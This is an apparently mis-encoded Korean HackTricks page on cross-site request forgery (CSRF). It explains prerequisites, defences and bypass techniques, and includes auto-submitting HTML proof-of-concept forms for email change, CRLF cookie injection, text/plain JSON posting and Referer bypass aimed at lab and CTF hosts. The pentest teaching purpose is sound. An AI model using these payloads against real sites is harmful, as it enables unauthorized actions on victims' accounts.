# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)ë¡œë¶€í„° AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

- **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
- [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
- **Discord ê·¸ë£¹**ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.
- **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œë¡œ PRì„ ì œì¶œí•˜ì—¬ ê·€í•˜ì˜ í•´í‚¹ ê¸°ìˆ ì„ ê³µìœ í•˜ì„¸ìš”.

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

ê²½í—˜ ë§ì€ í•´ì»¤ ë° ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ì™€ ì†Œí†µí•˜ë ¤ë©´ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ê°€ì…í•˜ì„¸ìš”!

**í•´í‚¹ í†µì°°ë ¥**\
í•´í‚¹ì˜ ìŠ¤ë¦´ê³¼ ë„ì „ì— ëŒ€í•´ íƒêµ¬í•˜ëŠ” ì½˜í…ì¸ ì™€ ìƒí˜¸ ì‘ìš©

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ì˜ ìµœì‹  ë‰´ìŠ¤ì™€ í†µì°°ë ¥ì„ ìœ ì§€í•˜ì„¸ìš”

**ìµœì‹  ê³µì§€**\
ì¶œì‹œë˜ëŠ” ìµœì‹  ë²„ê·¸ ë°”ìš´í‹° ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•´ ì •ë³´ë¥¼ ìœ ì§€í•˜ì„¸ìš”

**ìš°ë¦¬ì™€ í•¨ê»˜** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ì— ê°€ì…í•˜ì—¬ ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!

## Cross-Site Request Forgery (CSRF) ì„¤ëª…

**Cross-Site Request Forgery (CSRF)**ëŠ” ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ë°œê²¬ë˜ëŠ” ë³´ì•ˆ ì·¨ì•½ì  ìœ í˜•ì…ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ì¸ì¦ëœ ì„¸ì…˜ì„ ì•…ìš©í•˜ì—¬ ì˜ì‹¬ì¹˜ ì•ŠëŠ” ì‚¬ìš©ìë¥¼ ëŒ€ì‹ í•˜ì—¬ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê³µê²©ì€ í”¼í•´ìì˜ í”Œë«í¼ì— ë¡œê·¸ì¸í•œ ì‚¬ìš©ìê°€ ì•…ì˜ì ì¸ ì‚¬ì´íŠ¸ë¥¼ ë°©ë¬¸í•  ë•Œ ì‹¤í–‰ë©ë‹ˆë‹¤. ì´ ì‚¬ì´íŠ¸ëŠ” ìë°”ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰, ì–‘ì‹ ì œì¶œ ë˜ëŠ” ì´ë¯¸ì§€ ê°€ì ¸ì˜¤ê¸°ì™€ ê°™ì€ ë°©ë²•ì„ í†µí•´ í”¼í•´ìì˜ ê³„ì •ìœ¼ë¡œ ìš”ì²­ì„ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤.

### CSRF ê³µê²©ì„ ìœ„í•œ ì „ì œ ì¡°ê±´

CSRF ì·¨ì•½ì ì„ ì•…ìš©í•˜ë ¤ë©´ ë‹¤ìŒ ì¡°ê±´ì„ ì¶©ì¡±í•´ì•¼ í•©ë‹ˆë‹¤:

1. **ê°€ì¹˜ ìˆëŠ” ì‘ì—… ì‹ë³„**: ê³µê²©ìëŠ” ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ ë³€ê²½, ì´ë©”ì¼ ë³€ê²½ ë˜ëŠ” ê¶Œí•œ ìƒìŠ¹ê³¼ ê°™ì´ ì•…ìš©í•  ê°€ì¹˜ ìˆëŠ” ì‘ì—…ì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.
2. **ì„¸ì…˜ ê´€ë¦¬**: ì‚¬ìš©ìì˜ ì„¸ì…˜ì€ ì¿ í‚¤ ë˜ëŠ” HTTP ê¸°ë³¸ ì¸ì¦ í—¤ë”ë¥¼ í†µí•´ ê´€ë¦¬ë˜ì–´ì•¼ í•˜ë©°, ë‹¤ë¥¸ í—¤ë”ëŠ” ì´ ëª©ì ìœ¼ë¡œ ì¡°ì‘í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.
3. **ì˜ˆì¸¡í•  ìˆ˜ ì—†ëŠ” ë§¤ê°œë³€ìˆ˜ì˜ ë¶€ì¬**: ìš”ì²­ì— ì˜ˆì¸¡í•  ìˆ˜ ì—†ëŠ” ë§¤ê°œë³€ìˆ˜ê°€ í¬í•¨ë˜ì–´ì„œëŠ” ì•ˆ ë˜ë©°, ì´ëŠ” ê³µê²©ì„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ë¹ ë¥¸ í™•ì¸

**Burpì—ì„œ ìš”ì²­ì„ ìº¡ì²˜**í•˜ì—¬ CSRF ë³´í˜¸ë¥¼ í™•ì¸í•˜ê³  ë¸Œë¼ìš°ì €ì—ì„œ í…ŒìŠ¤íŠ¸í•˜ë ¤ë©´ **Copy as fetch**ë¥¼ í´ë¦­í•˜ì—¬ ìš”ì²­ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### CSRFì— ëŒ€í•œ ë°©ì–´

CSRF ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ì—¬ëŸ¬ ëŒ€ì±…ì„ ì‹œí–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- [**SameSite ì¿ í‚¤**](hacking-with-cookies/#samesite): ì´ ì†ì„±ì€ ë¸Œë¼ìš°ì €ê°€ êµì°¨ ì‚¬ì´íŠ¸ ìš”ì²­ê³¼ í•¨ê»˜ ì¿ í‚¤ë¥¼ ë³´ë‚´ì§€ ì•Šë„ë¡ í•©ë‹ˆë‹¤. [SameSite ì¿ í‚¤ì— ëŒ€í•´ ìì„¸íˆ ì•Œì•„ë³´ê¸°](hacking-with-cookies/#samesite).
- [**Cross-origin resource sharing**](cors-bypass.md): í”¼í•´ ì‚¬ì´íŠ¸ì˜ CORS ì •ì±…ì€ íŠ¹íˆ ê³µê²©ì´ í”¼í•´ ì‚¬ì´íŠ¸ì˜ ì‘ë‹µì„ ì½ëŠ” ê²ƒì„ ìš”êµ¬í•˜ëŠ” ê²½ìš°ì— ê³µê²©ì˜ ì‹¤í–‰ ê°€ëŠ¥ì„±ì— ì˜í–¥ì„ ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. [CORS ìš°íšŒì— ëŒ€í•´ ì•Œì•„ë³´ê¸°](cors-bypass.md).
- **ì‚¬ìš©ì í™•ì¸**: ì‚¬ìš©ìì˜ ì˜ë„ë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´ ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ìš”ì²­í•˜ê±°ë‚˜ ìº¡ì°¨ë¥¼ í•´ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- **Referrer ë˜ëŠ” Origin í—¤ë” í™•ì¸**: ì´ëŸ¬í•œ í—¤ë”ë¥¼ ìœ íš¨ì„± ê²€ì‚¬í•˜ì—¬ ìš”ì²­ì´ ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ì†ŒìŠ¤ì—ì„œ ì˜¤ëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ URLì˜ ì‹ ì¤‘í•œ ì¡°ì‘ìœ¼ë¡œ ì˜ëª» êµ¬í˜„ëœ í™•ì¸ì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- `http://mal.net?orig=http://example.com` (URLì´ ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” URLë¡œ ëë‚¨)
- `http://example.com.mal.net` (URLì´ ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” URLë¡œ ì‹œì‘í•¨)
- **ë§¤ê°œë³€ìˆ˜ ì´ë¦„ ìˆ˜ì •**: POST ë˜ëŠ” GET ìš”ì²­ì˜ ë§¤ê°œë³€ìˆ˜ ì´ë¦„ì„ ë³€ê²½í•¨ìœ¼ë¡œì¨ ìë™í™”ëœ ê³µê²©ì„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- **CSRF í† í°**: ê° ì„¸ì…˜ì— ê³ ìœ í•œ CSRF í† í°ì„ í¬í•¨í•˜ê³  í›„ì† ìš”ì²­ì—ì„œ ì´ í† í°ì„ ìš”êµ¬í•¨ìœ¼ë¡œì¨ CSRFì˜ ìœ„í—˜ì„ í¬ê²Œ ì¤„ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í† í°ì˜ íš¨ê³¼ëŠ” CORSë¥¼ ê°•ì œë¡œ ì ìš©í•¨ìœ¼ë¡œì¨ í–¥ìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ëŸ¬í•œ ë°©ì–´ ê¸°ë²•ì„ ì´í•´í•˜ê³  êµ¬í˜„í•˜ëŠ” ê²ƒì€ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë³´ì•ˆê³¼ ë¬´ê²°ì„±ì„ ìœ ì§€í•˜ëŠ” ë° ì¤‘ìš”í•©ë‹ˆë‹¤.

## ë°©ì–´ ìš°íšŒ

### POSTì—ì„œ GETìœ¼ë¡œ

ì•…ìš©í•˜ë ¤ëŠ” ì–‘ì‹ì´ **CSRF í† í°ì„ ì‚¬ìš©í•˜ì—¬ POST ìš”ì²­ì„ ë³´ë‚´ë„ë¡ ì¤€ë¹„**ë˜ì–´ ìˆì„ ìˆ˜ ìˆì§€ë§Œ, **GET**ë„ **ìœ íš¨í•œì§€ í™•ì¸**í•˜ê³  GET ìš”ì²­ì„ ë³´ë‚¼ ë•Œ **CSRF í† í°ì´ ì—¬ì „íˆ ìœ íš¨ì„± ê²€ì‚¬ë˜ëŠ”ì§€ í™•ì¸**í•´ì•¼ í•©ë‹ˆë‹¤.

### í† í° ë¶€ì¬

ì‘ìš© í”„ë¡œê·¸ë¨ì€ í† í°ì´ ìˆì„ ë•Œë§Œ **í† í°ì„ ìœ íš¨ì„± ê²€ì‚¬**í•˜ëŠ” ë©”ì»¤ë‹ˆì¦˜ì„ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ í† í°ì´ ì—†ì„ ë•Œ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ìƒëµí•˜ë©´ ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤. ê³µê²©ìëŠ” í† í°ì„ ìš´ë°˜í•˜ëŠ” ë§¤ê°œë³€ìˆ˜ë¥¼ ì œê±°í•¨ìœ¼ë¡œì¨ ìœ íš¨ì„± ê²€ì‚¬ í”„ë¡œì„¸ìŠ¤ë¥¼ ìš°íšŒí•˜ê³  CSRF ê³µê²©ì„ íš¨ê³¼ì ìœ¼ë¡œ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### CSRF í† í°ì´ ì‚¬ìš©ì ì„¸ì…˜ì— ë¬¶ì´ì§€ ì•ŠìŒ

CSRF í† í°ì„ ì‚¬ìš©ì ì„¸ì…˜ì— ë¬¶ì§€ ì•ŠëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì€ ì¤‘ìš”í•œ **ë³´ì•ˆ ìœ„í—˜**ì„ ì•¼ê¸°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì‹œìŠ¤í…œì€ ê° í† í°ì´ ì‹œì‘ ì„¸ì…˜ì— ë°”ì¸ë”©ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•˜ëŠ” ëŒ€ì‹  í† í°ì„ ì „ì—­ í’€ì— ëŒ€í•´ ê²€ì¦í•©ë‹ˆë‹¤.

ê³µê²©ìê°€ ë‹¤ìŒê³¼ ê°™ì´ ì´ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

1. ìì‹ ì˜ ê³„ì •ì„ ì‚¬ìš©í•˜ì—¬ **ì¸ì¦**í•©ë‹ˆë‹¤.
2. ì „ì—­ í’€ì—ì„œ ìœ íš¨í•œ CSRF í† í°ì„ **íšë“**í•©ë‹ˆë‹¤.
3. ì´ í† í°ì„ í”¼í•´ìì— ëŒ€í•œ CSRF ê³µê²©ì— **ì‚¬ìš©**í•©ë‹ˆë‹¤.

ì´ ì·¨ì•½ì ì„ í†µí•´ ê³µê²©ìëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì˜ **ë¶€ì ì ˆí•œ í† í° ìœ íš¨ì„± ê²€ì‚¬ ë©”ì»¤ë‹ˆì¦˜**ì„ ì•…ìš©í•˜ì—¬ í”¼í•´ìë¥¼ ëŒ€ì‹ í•˜ì—¬ ë¬´ë‹¨ ìš”ì²­ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ë©”ì„œë“œ ìš°íšŒ

ìš”ì²­ì´ "**ì´ìƒí•œ**" **ë©”ì„œë“œ**ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°, **ë©”ì„œë“œ** **ì˜¤ë²„ë¼ì´ë“œ ê¸°ëŠ¥**ì´ ì‘ë™í•˜ëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”. ì˜ˆë¥¼ ë“¤ì–´, **PUT** ë©”ì„œë“œë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš° **POST** ë©”ì„œë“œë¥¼ ì‹œë„í•˜ê³  ë‹¤ìŒì„ **ë³´ë‚´ì„¸ìš”**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

ì´ëŠ” **POST ìš”ì²­ ë‚´ë¶€ì— \_method ë§¤ê°œë³€ìˆ˜ë¥¼ ë³´ë‚´ëŠ” ê²ƒ**ì´ë‚˜ **í—¤ë”ë¥¼ ì‚¬ìš©**í•˜ì—¬ë„ ì‘ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- _X-HTTP-Method_
- _X-HTTP-Method-Override_
- _X-Method-Override_

### ì‚¬ìš©ì ì§€ì • í—¤ë” í† í° ìš°íšŒ

ìš”ì²­ì´ **CSRF ë³´í˜¸ ë°©ë²•ìœ¼ë¡œ í—¤ë”ì— í† í°ì„ ì¶”ê°€**í•˜ëŠ” ê²½ìš°:

- **ì‚¬ìš©ì ì§€ì • í† í° ë° í—¤ë” ì—†ì´** ìš”ì²­ì„ í…ŒìŠ¤íŠ¸í•˜ì„¸ìš”.
- **ê¸¸ì´ëŠ” ë™ì¼í•˜ì§€ë§Œ ë‹¤ë¥¸ í† í°**ì„ ì‚¬ìš©í•˜ì—¬ ìš”ì²­ì„ í…ŒìŠ¤íŠ¸í•˜ì„¸ìš”.

### CSRF í† í°ì´ ì¿ í‚¤ë¡œ í™•ì¸ë¨

ì‘ìš© í”„ë¡œê·¸ë¨ì€ í† í°ì„ ì¿ í‚¤ì™€ ìš”ì²­ ë§¤ê°œë³€ìˆ˜ì— ì¤‘ë³µí•˜ì—¬ ì„¤ì •í•˜ê±°ë‚˜ CSRF ì¿ í‚¤ë¥¼ ì„¤ì •í•˜ê³  ë°±ì—”ë“œì—ì„œ ë³´ë‚¸ í† í°ì´ ì¿ í‚¤ì™€ ì¼ì¹˜í•˜ëŠ”ì§€ í™•ì¸í•˜ì—¬ CSRF ë³´í˜¸ë¥¼ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‘ìš© í”„ë¡œê·¸ë¨ì€ ìš”ì²­ì„ ìœ íš¨ì„± ê²€ì‚¬í•˜ì—¬ ìš”ì²­ ë§¤ê°œë³€ìˆ˜ì˜ í† í°ì´ ì¿ í‚¤ì˜ ê°’ê³¼ ì¼ì¹˜í•˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ ì´ ë°©ë²•ì€ ì›¹ ì‚¬ì´íŠ¸ì— CRLF ì·¨ì•½ì ê³¼ ê°™ì€ ê²°í•¨ì´ í—ˆìš©ë˜ì–´ ê³µê²©ìê°€ í”¼í•´ìì˜ ë¸Œë¼ìš°ì €ì— CSRF ì¿ í‚¤ë¥¼ ì„¤ì •í•  ìˆ˜ ìˆëŠ” ê²½ìš° CSRF ê³µê²©ì— ì·¨ì•½í•©ë‹ˆë‹¤. ê³µê²©ìëŠ” ì†ì„ìˆ˜ ì´ë¯¸ì§€ë¥¼ë¡œë“œí•˜ì—¬ ì¿ í‚¤ë¥¼ ì„¤ì •í•œ ë‹¤ìŒ CSRF ê³µê²©ì„ ì‹œì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤ìŒì€ ê³µê²©ì´ êµ¬ì„±ë  ìˆ˜ ìˆëŠ” ì˜ˆì‹œì…ë‹ˆë‹¤:
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
**csrf í† í°ì´ ì„¸ì…˜ ì¿ í‚¤ì™€ ê´€ë ¨ì´ ìˆë‹¤ë©´ ì´ ê³µê²©ì€ ì‘ë™í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì™œëƒí•˜ë©´ í”¼í•´ìì—ê²Œ ì„¸ì…˜ì„ ì„¤ì •í•´ì•¼ í•˜ë©°, ê²°ê³¼ì ìœ¼ë¡œ ìì‹ ì— ëŒ€í•œ ê³µê²©ì„ í•˜ê²Œ ë  ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

### Content-Type ë³€ê²½

[**ì—¬ê¸°**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests)ì— ë”°ë¥´ë©´ **POST** ë°©ë²•ì„ ì‚¬ìš©í•˜ì—¬ **ì‚¬ì „ í†µì§€(preflight)** ìš”ì²­ì„ í”¼í•˜ê¸° ìœ„í•´ í—ˆìš©ëœ Content-Type ê°’ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

- **`application/x-www-form-urlencoded`**
- **`multipart/form-data`**
- **`text/plain`**

ê·¸ëŸ¬ë‚˜, **ì„œë²„ì˜ ë¡œì§ì´ Content-Typeì— ë”°ë¼ ë‹¤ë¥¼ ìˆ˜ ìˆìœ¼ë¯€ë¡œ** ì–¸ê¸‰ëœ ê°’ë“¤ê³¼ **`application/json`**, **`text/xml`**, **`application/xml`**ê³¼ ê°™ì€ ë‹¤ë¥¸ ê°’ë“¤ì„ ì‹œë„í•´ì•¼ í•©ë‹ˆë‹¤.

ì˜ˆì‹œ (from [ì—¬ê¸°](https://brycec.me/posts/corctf\_2021\_challenges))ë¡œ JSON ë°ì´í„°ë¥¼ text/plainìœ¼ë¡œ ë³´ë‚´ëŠ” ë°©ë²•:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### JSON ë°ì´í„°ë¥¼ ìœ„í•œ Preflight ìš”ì²­ ìš°íšŒ

JSON ë°ì´í„°ë¥¼ POST ìš”ì²­ìœ¼ë¡œ ë³´ë‚´ë ¤ê³  í•  ë•Œ, HTML í¼ì—ì„œ `Content-Type: application/json`ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì€ ì§ì ‘ì ìœ¼ë¡œ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤. ë§ˆì°¬ê°€ì§€ë¡œ, ì´ ë‚´ìš© ìœ í˜•ì„ ë³´ë‚´ê¸° ìœ„í•´ `XMLHttpRequest`ë¥¼ ì‚¬ìš©í•˜ë©´ ì‚¬ì „ í”Œë¼ì´íŠ¸ ìš”ì²­ì´ ì‹œì‘ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ Content-Typeì— ê´€ê³„ì—†ì´ ì„œë²„ê°€ JSON ë°ì´í„°ë¥¼ ì²˜ë¦¬í•˜ëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ ì´ ì œí•œì„ ìš°íšŒí•  ìˆ˜ ìˆëŠ” ì „ëµì´ ìˆìŠµë‹ˆë‹¤:

1. **ëŒ€ì²´ Content Type ì‚¬ìš©**: í¼ì—ì„œ `enctype="text/plain"`ì„ ì„¤ì •í•˜ì—¬ `Content-Type: text/plain` ë˜ëŠ” `Content-Type: application/x-www-form-urlencoded`ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ ì ‘ê·¼ ë°©ì‹ì€ ë°±ì—”ë“œê°€ Content-Typeì— ê´€ê³„ì—†ì´ ë°ì´í„°ë¥¼ ì‚¬ìš©í•˜ëŠ”ì§€ í…ŒìŠ¤íŠ¸í•©ë‹ˆë‹¤.
2. **Content Type ìˆ˜ì •**: ì‚¬ì „ í”Œë¼ì´íŠ¸ ìš”ì²­ì„ í”¼í•˜ë©´ì„œ ì„œë²„ê°€ ë‚´ìš©ì„ JSONìœ¼ë¡œ ì¸ì‹í•˜ë„ë¡ í•˜ë ¤ë©´ ë°ì´í„°ë¥¼ `Content-Type: text/plain; application/json`ìœ¼ë¡œ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ ì‚¬ì „ í”Œë¼ì´íŠ¸ ìš”ì²­ì´ íŠ¸ë¦¬ê±°ë˜ì§€ ì•Šì§€ë§Œ ì„œë²„ê°€ `application/json`ì„ ìˆ˜ë½í•˜ë„ë¡ êµ¬ì„±ëœ ê²½ìš° ì˜¬ë°”ë¥´ê²Œ ì²˜ë¦¬ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
3. **SWF í”Œë˜ì‹œ íŒŒì¼ í™œìš©**: ëœ ì¼ë°˜ì ì´ì§€ë§Œ ì‹¤í–‰ ê°€ëŠ¥í•œ ë°©ë²•ìœ¼ë¡œëŠ” ì´ëŸ¬í•œ ì œí•œì„ ìš°íšŒí•˜ê¸° ìœ„í•´ SWF í”Œë˜ì‹œ íŒŒì¼ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ìˆìŠµë‹ˆë‹¤. ì´ ê¸°ìˆ ì— ëŒ€í•œ ê¹Šì€ ì´í•´ë¥¼ ìœ„í•´ì„œëŠ” [ì´ ê²Œì‹œë¬¼](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)ì„ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.

### Referrer / Origin í™•ì¸ ìš°íšŒ

**Referrer í—¤ë” íšŒí”¼**

ì‘ìš© í”„ë¡œê·¸ë¨ì€ 'Referer' í—¤ë”ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë¸Œë¼ìš°ì €ê°€ ì´ í—¤ë”ë¥¼ ë³´ë‚´ì§€ ì•Šë„ë¡ í•˜ë ¤ë©´ ë‹¤ìŒ HTML ë©”íƒ€ íƒœê·¸ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```xml
<meta name="referrer" content="never">
```
ì´ëŠ” 'Referer' í—¤ë”ê°€ ì œì™¸ë˜ì–´ ì¼ë¶€ ì‘ìš© í”„ë¡œê·¸ë¨ì˜ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆë„ë¡í•©ë‹ˆë‹¤.

**ì •ê·œ í‘œí˜„ì‹ ìš°íšŒ**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Referrerê°€ ë³´ë‚¼ ì„œë²„ì˜ ë„ë©”ì¸ ì´ë¦„ì„ URLì— ì„¤ì •í•˜ë ¤ë©´ ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **HEAD ë©”ì†Œë“œ ìš°íšŒ**

[**ì´ CTF í•´ì„¤**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution)ì˜ ì²« ë¶€ë¶„ì€ [Oakì˜ ì†ŒìŠ¤ ì½”ë“œ](https://github.com/oakserver/oak/blob/main/router.ts#L281)ì—ì„œ, ë¼ìš°í„°ê°€ **ì‘ë‹µ ë³¸ë¬¸ì´ ì—†ëŠ” GET ìš”ì²­ìœ¼ë¡œ HEAD ìš”ì²­ì„ ì²˜ë¦¬**í•˜ë„ë¡ ì„¤ì •ë˜ì–´ ìˆë‹¤ëŠ” ê²ƒì„ ì„¤ëª…í•©ë‹ˆë‹¤. ì´ëŠ” Oakì—ë§Œ í•´ë‹¹ë˜ëŠ” ê²ƒì´ ì•„ë‹Œ ì¼ë°˜ì ì¸ í•´ê²°ì±…ì…ë‹ˆë‹¤. HEAD ìš”ì²­ì„ ì²˜ë¦¬í•˜ëŠ” íŠ¹ì • í•¸ë“¤ëŸ¬ ëŒ€ì‹ , HEAD ìš”ì²­ì€ **ë‹¨ìˆœíˆ GET í•¸ë“¤ëŸ¬ì— ì „ë‹¬ë˜ì§€ë§Œ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì‘ë‹µ ë³¸ë¬¸ì„ ì œê±°**í•©ë‹ˆë‹¤.

ë”°ë¼ì„œ, GET ìš”ì²­ì´ ì œí•œë˜ì–´ ìˆë‹¤ë©´, **GET ìš”ì²­ìœ¼ë¡œ ì²˜ë¦¬ë  HEAD ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

## **ì•…ìš© ì˜ˆì‹œ**

### **CSRF í† í° ìœ ì¶œ**

ë§Œì•½ **CSRF í† í°**ì´ **ë°©ì–´ ìˆ˜ë‹¨**ìœ¼ë¡œ ì‚¬ìš©ë˜ê³  ìˆë‹¤ë©´, [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) ì·¨ì•½ì ì´ë‚˜ [**Dangling Markup**](dangling-markup-html-scriptless-injection/) ì·¨ì•½ì ì„ ì•…ìš©í•˜ì—¬ **ìœ ì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **HTML íƒœê·¸ë¥¼ ì‚¬ìš©í•œ GET**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
ë‹¤ë¥¸ HTML5 íƒœê·¸ë“¤ì€ ìë™ìœ¼ë¡œ GET ìš”ì²­ì„ ë³´ë‚´ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
